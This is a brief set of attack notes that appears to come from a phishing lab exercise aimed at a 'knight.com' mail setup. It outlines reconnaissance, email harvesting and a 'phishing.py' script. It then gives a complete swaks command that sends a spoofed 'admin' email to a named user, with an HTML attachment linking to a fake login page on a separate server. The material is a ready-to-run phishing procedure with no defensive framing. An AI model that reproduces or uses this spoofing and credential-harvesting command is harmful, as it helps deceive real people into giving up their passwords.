 
 Step 0: Network recon
 
 
 Step 1: Harvest emails
 
 
 Step 2:
Python3 phishing.py
 
 
 Step 3:

swaks \
  --to maria@knight.com \
  --from admin@knight.com \
  --server 10.10.0.146 \
  --header "Subject: Important Document" \
  --body "Dear user,\n\nPlease find attached the document you requested.\n\nBest regards,\nSupport Team" \
  --attach-type text/html \
  --attach-name "Document.html" \
  --attach-body "<html><body> http://10.10.0.118:5000/login </body></html>" \ 
  --port 587

